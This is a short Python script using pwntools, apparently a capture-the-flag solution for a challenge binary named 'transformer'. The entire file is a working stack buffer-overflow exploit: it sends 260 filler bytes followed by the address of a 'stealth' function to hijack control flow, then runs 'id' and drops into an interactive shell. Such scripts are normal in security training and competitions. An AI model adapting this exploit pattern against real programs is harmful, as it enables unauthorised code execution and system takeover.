#! /usr/bin/env python3
##
# Created for the Transformer challenge
# By Amos <LFlare> Ng
##
# Import pwntools
from pwn import *

# Load binary
context(os = 'linux', arch = 'i386')
elf = ELF('./transformer')

# Build payload
payload = ("A" * 260).encode() + pack(elf.symbols[b"stealth"])

# Build pipe
t = process("./transformer")

# Prepare to send payload
t.recvuntil("Word #1: ")
t.sendline(payload)
t.recvuntil("Word #2: ")
t.sendline("A")
t.clean()

# Check if r00ted
log.success("Are we r00ted?")
t.sendline("id")
t.interactive()
